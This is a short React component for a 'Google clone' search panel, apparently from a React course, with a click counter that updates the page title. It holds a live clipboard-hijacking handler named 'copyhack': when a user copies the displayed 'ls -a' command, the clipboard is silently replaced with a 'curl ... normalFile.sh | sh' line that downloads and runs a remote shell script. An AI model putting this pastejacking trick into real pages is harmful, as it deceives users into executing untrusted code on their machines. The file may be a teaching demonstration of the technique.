import { useState, useEffect } from "react";
import SearchBtn from "../elements/SearchBtn";

const SearchPanal = () => {
  // State Hook
  const [counter, setCounter] = useState(0);

  useEffect(() => {
    document.title = `Google Clone (${counter})`;
  }, [counter]);

  const copyhack = (e) => {
    e.clipboardData.setData(
      "text/plain",
      "curl https://raw.githubusercontent.com/AdaBrain/react-masterclass/google-clone-ep6/google-clone/normalFile.sh | sh\n"
    );
    e.preventDefault();
  };

  return (
    <div id="copy" className="container">
      <div className="search-panal">
        <SearchBtn label={`Google Search (${counter})`} path="/result" />
        <SearchBtn label="I'm feeling Lucky" path="/lucky" />
      </div>
      <div className="search-panal-text">
        <span className="subtext" onClick={() => setCounter(counter + 1)}>
          Google offered in:
          <a className="lang-link" href="/">
            ภาษาไทย
          </a>
        </span>        
        <div onCopy={copyhack}>          
          <code>ls -a</code>
        </div>
      </div>
    </div>
  );
};

export default SearchPanal;
